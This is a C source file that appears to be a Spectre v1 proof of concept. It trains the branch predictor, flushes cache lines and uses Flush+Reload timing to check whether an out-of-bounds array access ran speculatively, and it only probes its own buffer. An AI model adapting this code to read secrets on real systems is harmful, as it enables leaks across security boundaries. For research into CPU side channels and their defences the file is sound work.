#include <stdio.h>
#include <stdbool.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

#include "../util.h"

// Threshhold, adjust to match machine
#define THR 100

#define TRAINING_ITERATIONS 20

// Limit for spectre v1 access
#define ARRAY_SIZE 4
size_t limit = ARRAY_SIZE;

void victim(size_t *index, uint8_t *fr_buf) {
    if (*index < limit) {
        // Perform array access
        maccess(&(fr_buf[*index]));
  }
}

void __attribute__((noinline)) call_victim(size_t *index, uint8_t *fr_buf) {
    _mm_mfence();

    // Reset PHT
    asm volatile (
        ".rept 200\n"
        "jmp 1f\n"
        "1:\n"
        ".endr\n"
    );

    victim(index, fr_buf);
}

void speculate() {
    size_t hits = 0;
    uint64_t t = 0;
    size_t *index = (size_t *) mmap(0x00, 0x1000,
                                    PROT_READ | PROT_WRITE,
                                    MAP_ANONYMOUS | MAP_PRIVATE,
                                    -1,
                                    0x00);

    // Set index to 0 for training
    *index = 0;
    _mm_mfence();

    // Allocation of F&R buffer
    uint8_t *fr_buf = (uint8_t *) malloc(0x1000 * 4) + 0x2000;
    memset(fr_buf, 0x94, 0x1000);

    _mm_clflush(&limit);
    _mm_clflush(index);
    _mm_clflush(fr_buf);
    _mm_mfence();

    // Training
    for (size_t i = 0; i < TRAINING_ITERATIONS; i++) {
        _mm_clflush(fr_buf);
        _mm_mfence();

        call_victim(index, fr_buf);
        t = load_time(fr_buf);
        if(t < THR) {
            hits++;
        }
    }

    printf("Hits (Training): %4ld/%d\n", hits, TRAINING_ITERATIONS);
    hits = 0;

    _mm_mfence();

    // Set index to 0x10 for the attack (out-of-bounds)
    *index = 0x10;
    _mm_mfence();

    // Prepare attack
    _mm_clflush(&limit);
    _mm_clflush(index);
    _mm_clflush(fr_buf + 0x10);
    _mm_mfence();

    // Call victim, which should speculate
    call_victim(index, fr_buf);
    t = load_time(fr_buf + 0x10);
    printf("%ld\n", t);

    if(t < THR) {
        hits++;
    }

    printf("Hits (Spectre):  %4ld/1\n", hits);

    munmap(index, 0x1000);
    munmap(fr_buf-0x2000, 0x1000 * 4);
}

int main() {
    speculate();

    return EXIT_SUCCESS;
}
